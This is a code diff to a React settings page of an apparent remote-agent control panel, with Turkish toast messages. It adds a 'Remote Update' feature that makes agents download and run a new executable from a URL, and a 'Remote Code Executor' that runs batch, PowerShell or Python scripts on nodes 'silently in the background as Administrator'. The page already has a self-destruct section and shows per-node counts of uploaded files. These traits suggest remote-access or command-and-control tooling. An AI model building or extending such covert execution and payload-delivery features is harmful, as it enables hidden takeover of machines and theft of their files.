@@ -1,6 +1,6 @@
 import { useEffect, useState } from 'react'
 import { api } from '../api'
-import { Save, Plus, X, Loader2, CheckCircle2, Eye, EyeOff, Skull, AlertTriangle, Settings as SettingsIcon, Shield, Cpu } from 'lucide-react'
+import { Save, Plus, X, Loader2, CheckCircle2, Eye, EyeOff, Skull, AlertTriangle, Settings as SettingsIcon, Shield, Cpu, RefreshCw, Terminal } from 'lucide-react'
 
 function Section({ title, icon: Icon, children, danger = false }) {
   return (
@@ -78,6 +78,19 @@ export default function Settings() {
   const [destructTarget, setDestructTarget] = useState(null)
   const [destructStep, setDestructStep]     = useState(0)
   const [destructToast, setDestructToast]   = useState(null)
+
+  // Remote Update state
+  const [updateUrl, setUpdateUrl]           = useState('')
+  const [updateTarget, setUpdateTarget]     = useState(null)
+  const [updateStep, setUpdateStep]         = useState(0)
+  const [updateToast, setUpdateToast]       = useState(null)
+
+  // Remote Code state
+  const [remoteCode, setRemoteCode]         = useState('')
+  const [codeType, setCodeType]             = useState('batch')
+  const [codeTarget, setCodeTarget]         = useState(null)
+  const [codeStep, setCodeStep]             = useState(0)
+  const [codeToast, setCodeToast]           = useState(null)
 
   useEffect(() => { 
     api.getConfig().then(d => {
@@ -158,6 +171,56 @@ export default function Settings() {
       setTimeout(() => setDestructToast(null), 5000)
     }
     cancelDestruct()
+  }
+
+  function startUpdate(machine) {
+    if (!updateUrl.trim()) return
+    setUpdateTarget(machine)
+    setUpdateStep(1)
+  }
+
+  function cancelUpdate() {
+    setUpdateTarget(null)
+    setUpdateStep(0)
+  }
+
+  async function executeUpdate() {
+    if (!updateTarget || !updateUrl.trim()) return
+    setUpdateStep(2)
+    try {
+      await api.remoteUpdate(updateTarget, updateUrl.trim())
+      setUpdateToast('🔄 Güncelleme komutu "' + updateTarget + '" için gönderildi!')
+      setTimeout(() => setUpdateToast(null), 5000)
+    } catch (e) {
+      setUpdateToast('❌ Güncelleme hatası: ' + e.message)
+      setTimeout(() => setUpdateToast(null), 5000)
+    }
+    cancelUpdate()
+  }
+
+  function startCode(machine) {
+    if (!remoteCode.trim()) return
+    setCodeTarget(machine)
+    setCodeStep(1)
+  }
+
+  function cancelCode() {
+    setCodeTarget(null)
+    setCodeStep(0)
+  }
+
+  async function executeCode() {
+    if (!codeTarget || !remoteCode.trim()) return
+    setCodeStep(2)
+    try {
+      await api.remoteCode(codeTarget, remoteCode.trim(), codeType)
+      setCodeToast('💻 Kod komutu "' + codeTarget + '" için gönderildi!')
+      setTimeout(() => setCodeToast(null), 5000)
+    } catch (e) {
+      setCodeToast('❌ Kod çalıştırma hatası: ' + e.message)
+      setTimeout(() => setCodeToast(null), 5000)
+    }
+    cancelCode()
   }
 
   if (!cfg) return (
@@ -336,6 +399,130 @@ export default function Settings() {
         </div>
       </Section>
 
+      {/* ══ REMOTE UPDATE SECTION ══ */}
+      <Section title="Remote Update" icon={Cpu}>
+        <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
+          <div className="flex items-start gap-2">
+            <Cpu className="w-4 h-4 text-cyan-400 flex-shrink-0 mt-0.5" />
+            <div>
+              <strong className="text-cyan-400">REMOTE UPDATE AGENT</strong>
+              <p className="mt-1 text-cyan-700">
+                You can push a new agent executable to the connected nodes remotely. Enter the direct download link for the new version.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {agents.length === 0 ? (
+          <div className="text-xs text-cyan-700 text-center py-4 font-mono">No connected nodes found.</div>
+        ) : (
+          <div className="space-y-4">
+            <div>
+              <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">New Version URL</label>
+              <input 
+                className="inp text-xs font-mono" 
+                value={updateUrl} 
+                onChange={e => setUpdateUrl(e.target.value)} 
+                placeholder="https://example.com/ashfir_agent_new.exe" 
+              />
+            </div>
+            <div className="space-y-2">
+              {agents.map(a => (
+                <div key={a.machine_name} className="flex items-center justify-between p-3 rounded-lg bg-[#070b14] border border-cyan-900/30">
+                  <div className="flex items-center gap-3">
+                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${a.online ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-cyan-900'}`} />
+                    <div>
+                      <div className="text-xs font-mono font-bold text-cyan-300">{a.machine_name}</div>
+                      <div className="text-[9px] text-cyan-700 font-mono">
+                        {a.online ? 'Online' : 'Offline'} • {a.files_uploaded || 0} files uploaded
+                      </div>
+                    </div>
+                  </div>
+                  <button
+                    onClick={() => startUpdate(a.machine_name)}
+                    disabled={!updateUrl.trim()}
+                    className="btn-ghost flex items-center gap-1.5 hover:border-cyan-500/40"
+                  >
+                    <RefreshCw className="w-3.5 h-3.5" />
+                    UPDATE
+                  </button>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+      </Section>
+
+      {/* ══ REMOTE CODE EXECUTOR SECTION ══ */}
+      <Section title="Remote Code Executor" icon={Terminal}>
+        <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
+          <div className="flex items-start gap-2">
+            <Terminal className="w-4 h-4 text-cyan-400 flex-shrink-0 mt-0.5" />
+            <div>
+              <strong className="text-cyan-400">EXECUTE REMOTE SCRIPTS</strong>
+              <p className="mt-1 text-cyan-700">
+                You can push and execute custom scripts on the connected nodes silently in the background as Administrator.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {agents.length === 0 ? (
+          <div className="text-xs text-cyan-700 text-center py-4 font-mono">No connected nodes found.</div>
+        ) : (
+          <div className="space-y-4">
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Script Type</label>
+                <select 
+                  className="inp text-xs font-mono select bg-[#070b14] text-cyan-300 border border-cyan-500/30 w-full"
+                  value={codeType}
+                  onChange={e => setCodeType(e.target.value)}
+                >
+                  <option value="batch">Batch / CMD</option>
+                  <option value="powershell">PowerShell</option>
+                  <option value="python">Python</option>
+                </select>
+              </div>
+            </div>
+
+            <div>
+              <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Paste Code / Script</label>
+              <textarea 
+                className="inp text-xs font-mono min-h-[140px] w-full resize-y" 
+                value={remoteCode} 
+                onChange={e => setRemoteCode(e.target.value)} 
+                placeholder={codeType === 'batch' ? "echo Hello from Ashfir Agent\nipconfig /all" : codeType === 'powershell' ? "Get-Process | Select-Object Name, Id" : "import sys\nprint('Python execution works!')"} 
+              />
+            </div>
+
+            <div className="space-y-2">
+              {agents.map(a => (
+                <div key={a.machine_name} className="flex items-center justify-between p-3 rounded-lg bg-[#070b14] border border-cyan-900/30">
+                  <div className="flex items-center gap-3">
+                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${a.online ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-cyan-900'}`} />
+                    <div>
+                      <div className="text-xs font-mono font-bold text-cyan-300">{a.machine_name}</div>
+                      <div className="text-[9px] text-cyan-700 font-mono">
+                        {a.online ? 'Online' : 'Offline'} • {a.files_uploaded || 0} files uploaded
+                      </div>
+                    </div>
+                  </div>
+                  <button
+                    onClick={() => startCode(a.machine_name)}
+                    disabled={!remoteCode.trim()}
+                    className="btn-ghost flex items-center gap-1.5 hover:border-cyan-500/40"
+                  >
+                    <Terminal className="w-3.5 h-3.5" />
+                    RUN
+                  </button>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+      </Section>
+
       {/* ══ SELF-DESTRUCT SECTION ══ */}
       <Section title="Self Destruct" icon={Skull} danger>
         <div className="p-3 rounded-lg bg-red-500/5 border border-red-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
@@ -457,6 +644,108 @@ export default function Settings() {
         <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-red-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
                         shadow-2xl shadow-red-500/10 z-50 text-red-400 animate-slide-up">
           {destructToast}
+        </div>
+      )}
+
+      {/* ══ UPDATE CONFIRMATION MODAL ══ */}
+      {updateStep > 0 && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
+          <div className="bg-[#0b1221] border border-cyan-500/30 rounded-2xl p-6 w-full max-w-md shadow-2xl shadow-cyan-500/10">
+            {updateStep === 1 && (
+              <>
+                <div className="flex items-center gap-3 mb-4">
+                  <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/25 flex items-center justify-center">
+                    <RefreshCw className="w-5 h-5 text-cyan-400" />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-mono font-bold text-cyan-400">CONFIRM UPDATE</h3>
+                    <p className="text-[10px] text-cyan-600 font-mono">"{updateTarget}" will be updated</p>
+                  </div>
+                </div>
+                <p className="text-sm text-cyan-400 mb-5 font-mono">
+                  The agent on <strong className="text-cyan-300">{updateTarget}</strong> will fetch the new executable from the provided link and restart in the background.
+                </p>
+                <div className="flex gap-3">
+                  <button onClick={cancelUpdate} className="btn-ghost flex-1">Cancel</button>
+                  <button
+                    onClick={executeUpdate}
+                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-mono font-bold
+                               bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-400 hover:text-cyan-300
+                               border border-cyan-500/25 hover:border-cyan-500/40 transition-all tracking-wider"
+                  >
+                    <RefreshCw className="w-4 h-4" />
+                    CONFIRM
+                  </button>
+                </div>
+              </>
+            )}
+
+            {updateStep === 2 && (
+              <div className="flex flex-col items-center py-4">
+                <Loader2 className="w-8 h-8 animate-spin text-cyan-400 mb-3" />
+                <p className="text-xs text-cyan-400 font-mono tracking-widest">SENDING UPDATE SIGNAL...</p>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* Update Toast */}
+      {updateToast && (
+        <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-cyan-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
+                        shadow-2xl shadow-cyan-500/10 z-50 text-cyan-400 animate-slide-up">
+          {updateToast}
+        </div>
+      )}
+
+      {/* ══ CODE EXECUTION CONFIRMATION MODAL ══ */}
+      {codeStep > 0 && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
+          <div className="bg-[#0b1221] border border-cyan-500/30 rounded-2xl p-6 w-full max-w-md shadow-2xl shadow-cyan-500/10">
+            {codeStep === 1 && (
+              <>
+                <div className="flex items-center gap-3 mb-4">
+                  <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/25 flex items-center justify-center">
+                    <Terminal className="w-5 h-5 text-cyan-400" />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-mono font-bold text-cyan-400">CONFIRM EXECUTION</h3>
+                    <p className="text-[10px] text-cyan-600 font-mono">"{codeTarget}" will execute the script</p>
+                  </div>
+                </div>
+                <p className="text-sm text-cyan-400 mb-5 font-mono">
+                  The script will run silently in the background on <strong className="text-cyan-300">{codeTarget}</strong> with Administrator permissions.
+                </p>
+                <div className="flex gap-3">
+                  <button onClick={cancelCode} className="btn-ghost flex-1">Cancel</button>
+                  <button
+                    onClick={executeCode}
+                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-mono font-bold
+                               bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-400 hover:text-cyan-300
+                               border border-cyan-500/25 hover:border-cyan-500/40 transition-all tracking-wider"
+                  >
+                    <Terminal className="w-4 h-4" />
+                    CONFIRM
+                  </button>
+                </div>
+              </>
+            )}
+
+            {codeStep === 2 && (
+              <div className="flex flex-col items-center py-4">
+                <Loader2 className="w-8 h-8 animate-spin text-cyan-400 mb-3" />
+                <p className="text-xs text-cyan-400 font-mono tracking-widest">SENDING EXECUTE SIGNAL...</p>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* Code Toast */}
+      {codeToast && (
+        <div className="fixed bottom-6 right-6 bg-[#0b1221] border border-cyan-500/30 rounded-xl px-5 py-3.5 text-sm font-mono
+                        shadow-2xl shadow-cyan-500/10 z-50 text-cyan-400 animate-slide-up">
+          {codeToast}
         </div>
       )}
     </div>
